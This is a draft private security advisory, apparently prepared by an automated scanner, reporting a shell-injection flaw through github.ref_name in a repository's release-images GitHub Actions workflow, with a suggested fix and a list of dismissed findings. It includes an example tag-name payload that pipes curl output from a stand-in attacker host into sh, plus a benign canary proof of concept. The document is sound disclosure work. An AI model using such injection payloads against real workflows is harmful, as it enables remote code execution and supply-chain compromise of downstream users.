# Private Vulnerability Report Draft — guillaumemeyer/watermarks-remover

**Target repo:** `guillaumemeyer/watermarks-remover`
**Commit scanned:** `1a865e4d190796560419efa625481bf433e06bc5` (2026-08-21)
**Disclosure channel:** GitHub Private Vulnerability Report (PVR) via `POST /repos/guillaumemeyer/watermarks-remover/security-advisories`
**Rationale:** The repo's `SECURITY.md` explicitly directs private reports to GitHub Security Advisories and welcomes them. PVR endpoint is enabled (`GET /repos/.../security-advisories` returned `[]`, not 403/404). One code finding; publishing the exploit shape in a public PR would be irresponsible.
**Submission mode:** Draft for operator out-of-band submission — the Aeon GitHub App cannot fork or create advisories on third-party repos from cron per [[github-app-cannot-fork-third-party-repos]].

---

## Advisory body

**Summary:** Shell injection via `${{ github.ref_name }}` in `release-images.yml`

**Severity:** Medium (CVSS 3.1 estimate: `AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H` — high privileges required, supply-chain scope change)

**CWE:** CWE-78 (OS Command Injection), CWE-77 (Command Injection), CWE-1104 (Use of Unmaintained Third-Party Components — n/a; primary is CWE-78 in a workflow context)

### Description

Two `run:` steps in `.github/workflows/release-images.yml` interpolate `${{ github.ref_name }}` directly inside a shell script:

- `.github/workflows/release-images.yml:28` (build-core job, "Compute image tags")
- `.github/workflows/release-images.yml:63` (build-harnesses matrix job, "Compute image tags")

The pattern (line 27–30, quoted for context):

```yaml
- name: Compute image tags
  id: tags
  run: |
    TAG="${{ github.ref_name }}"
    echo "tags=ghcr.io/guillaumemeyer/watermarks-remover:${TAG},ghcr.io/guillaumemeyer/watermarks-remover:latest" >> "$GITHUB_OUTPUT"
    echo "version=${TAG#v}" >> "$GITHUB_OUTPUT"
```

At workflow evaluation time, GitHub Actions substitutes `${{ github.ref_name }}` into the script text *before* the shell parses it. For a `push: tags: ["v*"]` trigger, `github.ref_name` is the pushed tag name. Git tag names permit `"`, `;`, `$`, `` ` ``, `(`, `)`, `\`, and other shell metacharacters — the only disallowed set is spaces, `..`, `~`, `^`, `:`, `?`, `*`, `[`. A tag like

```
v1.0.0"; curl -sSf https://attacker.example/x | sh #
```

is a legal Git ref and expands the `run:` script into

```bash
TAG="v1.0.0"; curl -sSf https://attacker.example/x | sh #"
echo "tags=…:${TAG},…" >> "$GITHUB_OUTPUT"
```

executing the attacker's shell inside the job.

### Impact

The affected job runs with `packages: write` and `id-token: write` (see `permissions:` block at the top of the workflow) and holds the ambient `GITHUB_TOKEN`. Successful injection gives the attacker:

- Ability to publish arbitrary images to `ghcr.io/guillaumemeyer/watermarks-remover:*` (any tag), including replacing `:latest`, `:v<future-version>`, and the `markllm-latest` / `markdiffusion-latest` tags on subsequent tag pushes — a downstream **supply-chain compromise** for every user pulling from the published GHCR namespace.
- An OIDC ID token that could be used for attestation-based supply-chain trust systems the maintainer or downstream consumers might adopt.
- The workflow's runner environment for the duration of the job (secrets from `GITHUB_TOKEN`, network egress).

### Prerequisites

An attacker needs the ability to push a matching tag (`v*`) or dispatch the workflow. This narrows the practical attacker to:

- A maintainer with push access whose account is compromised.
- A collaborator with `contents: write` (e.g. a temporary release helper).
- Any actor who obtains a token with `contents: write` scope for the repo (e.g. via a leaked deploy key, phishing, malicious npm/PyPI supply-chain into the maintainer's dev env, or a `pull_request_target`-style bug elsewhere granting write privilege).

The bar is not "any GitHub user" — it is "any actor with push access." That still puts this squarely in the class of workflow hardening that GitHub, Semgrep, and the CodeQL `actions/actions-injection` query all recommend fixing, precisely because the blast radius (persistent supply-chain compromise via `packages: write` + `id-token: write`) makes it disproportionate to the friction of the fix.

Note: `${{ matrix.tag }}` on line 63 is also interpolated but is defined statically in the workflow (`markllm`/`markdiffusion`), so it is not attacker-controlled. Only `${{ github.ref_name }}` matters.

### Proof of exploitation

Non-destructive PoC (no working exploit chain — a token-write of a canary file is sufficient to demonstrate execution):

1. In a private fork with the same workflow, push a tag whose name contains a shell metacharacter and a benign side-effect:
   ```
   git tag 'v0.0.0-canary";echo INJECTED > /tmp/canary #'
   git push origin 'v0.0.0-canary";echo INJECTED > /tmp/canary #'
   ```
2. Observe the "Compute image tags" step logs: the injected command runs, producing `/tmp/canary` in the runner. (In a private fork, no artifact is published to GHCR; a benign echo verifies execution.)

### Suggested fix

Move the tag into a step-level `env:` block so the shell reads it as a variable, not literal script text:

```yaml
- name: Compute image tags
  id: tags
  env:
    REF_NAME: ${{ github.ref_name }}
    MATRIX_TAG: ${{ matrix.tag }}   # harnesses job only
  run: |
    echo "tags=ghcr.io/guillaumemeyer/watermarks-remover:${REF_NAME},ghcr.io/guillaumemeyer/watermarks-remover:latest" >> "$GITHUB_OUTPUT"
    echo "version=${REF_NAME#v}" >> "$GITHUB_OUTPUT"
```

The template value now lands in the process environment; the shell substitutes `${REF_NAME}` as a variable at execution time, not workflow-parse time. Shell metacharacters in the tag are treated as literal string content.

Optionally, add a paranoid ref-name whitelist as defense in depth:

```yaml
run: |
  case "$REF_NAME" in
    v[0-9]*.[0-9]*.[0-9]*) : ;;
    *) echo "refusing non-semver tag: $REF_NAME"; exit 1 ;;
  esac
  ...
```

This class of issue is what the GitHub docs "Security hardening for GitHub Actions → Understanding the risk of script injections" section covers; the same rule applies here as for `github.event.issue.title`, `github.head_ref`, etc.

### Detected by

Aeon + Semgrep `yaml.github-actions.security.run-shell-injection`. Same rule flagged by GitHub's own CodeQL `actions/actions-injection` query.

### Location

- `.github/workflows/release-images.yml:28`
- `.github/workflows/release-images.yml:63`

### References

- [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [CodeQL `actions/actions-injection`](https://codeql.github.com/codeql-query-help/actions/actions-injection/)
- [Semgrep `yaml.github-actions.security.run-shell-injection`](https://semgrep.dev/r/yaml.github-actions.security.run-shell-injection.run-shell-injection)

---

## Operator submission checklist

- [ ] Open https://github.com/guillaumemeyer/watermarks-remover/security/advisories/new
- [ ] Title: `Shell injection via github.ref_name in release-images.yml`
- [ ] Severity: Medium
- [ ] CWE: `CWE-78`
- [ ] Affected products: `.github/workflows/release-images.yml` on `main` (commit `1a865e4`)
- [ ] Paste the advisory body above (Description → Impact → PoC → Suggested fix)
- [ ] Optional: link to a private fix branch demonstrating the env-block rewrite

## What was NOT included in this PVR

The following semgrep hits were reviewed and dropped as false-positive after per-file inspection, so as not to waste maintainer triage cycles:

- `service/scripts/audit_website.py:24` — `xml.etree.ElementTree.fromstring`. Guarded by an explicit `b"<!DOCTYPE"`/`b"<!ENTITY"` byte-prefix rejection before parsing (line 87–88), and stdlib ET does not expand external entities by default. A UTF-16-encoded sitemap could bypass the byte-check to reach billion-laughs, but the resulting impact is process-level DoS which the maintainer's SECURITY.md flags as out-of-scope unless it "affects the host beyond normal process failure."
- `service/scripts/audit_website.py:346` — `HTTPSConnection`. Used inside a well-designed SSRF-hardened fetcher that IP-pins to a validated address while preserving TLS SNI and the `Host` header. Stdlib `HTTPSConnection` is the correct choice for that design.
- `service/scripts/image_meta.py:1424` — `urllib.request.Request` with dynamic URL. `base_url` comes from `WATERMARKS_SYNTHID_SCORER_URL` (operator env var) and the scheme is validated to `http`/`https` immediately above the call (line 1420–1422). Not attacker-influenced.
- `service/scripts/image_meta.py:1486` / `:1585` / `:1664` and `service/scripts/text_detectors.py:223` — `subprocess.run` with "user-controlled data." All four call sites use the list-form `subprocess.run([...])` with `shell=False` (default). Arguments include operator-configured `upstream_dir`/`REVERSE_SYNTHID_DIR` paths and user-supplied file paths, all passed as argv elements. No shell interpretation of metacharacters, so no command injection surface.

## What was reviewed but not flagged

Manually inspected: the HTTP server's `_safe_name`/`_tmp_path` filename hardening (with CodeQL-anchored defense-in-depth comments), the OOXML zip-bomb guard (`_check_zip_budget` / `_read_zip_member` with a real-bytes accounting cap), SVG cleaner regex families (explicit linear-time scans, no ReDoS), the SSRF-hardened `_validated_target`/`_open_pinned_connection` HTTP fetcher, and the bearer-token auth path. All well-defended.

## Verified secrets

- Filesystem scan: **0 verified secrets** (352 chunks / 2.5 MB scanned)
- Git history scan: **0 verified secrets** (1,708 chunks / 1.5 MB scanned)
